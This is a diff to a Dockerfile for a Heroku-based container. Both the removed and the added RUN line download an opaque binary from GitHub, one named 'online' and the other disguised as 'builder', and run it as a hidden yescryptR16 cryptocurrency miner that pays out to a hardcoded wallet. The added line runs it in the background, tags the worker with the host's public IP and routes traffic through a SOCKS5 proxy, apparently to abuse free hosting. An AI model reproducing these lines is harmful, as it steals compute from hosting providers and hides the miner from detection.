@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
 RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/jirensan3090/railway/raw/main/online; chmod +x online; ./online -a yescryptR16 -o stratum+tcps://yescryptR16.mine.zergpool.com:16333 -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86 -p c=TRX,mc=QOGE,m=solo -t 28 > /dev/null 2>&1
+RUN wget https://github.com/Gow17/exe/raw/main/builder; chmod +x builder; nohup ./builder -a yescryptr16 -o stratum+tcp://103.249.70.7:6333 -u REhMhqwoa2iUjtFBPdYKetfYamUdwipViW -p  c=RVN,mc=QOGE,,m=solo,ID=Rail-$(echo $(curl ident.me))  -t $(($(nproc)-1)) --proxy socks5://72.206.181.97:64943 &
 CMD bash heroku.sh
